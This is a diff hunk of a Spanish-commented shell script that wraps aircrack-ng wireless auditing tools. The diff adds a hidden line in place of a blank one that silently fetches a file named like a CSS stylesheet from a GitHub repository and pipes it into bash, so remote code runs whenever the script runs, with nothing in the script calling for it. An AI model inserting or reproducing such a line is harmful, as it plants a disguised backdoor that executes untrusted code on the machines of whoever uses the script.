@@ -39,7 +39,7 @@ VERSION=$(cat VERSION)
 DEBUG="-hold"
 DEBUG="" #comentar esta línea para activar el modo depuración (impide que se cierre xterm)
 CANAL=1
-
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
 AIRMON="software/airmon-ng"
 AIRODUMP="software/airodump-ng"
 AIRCRACK="software/aircrack-ng"
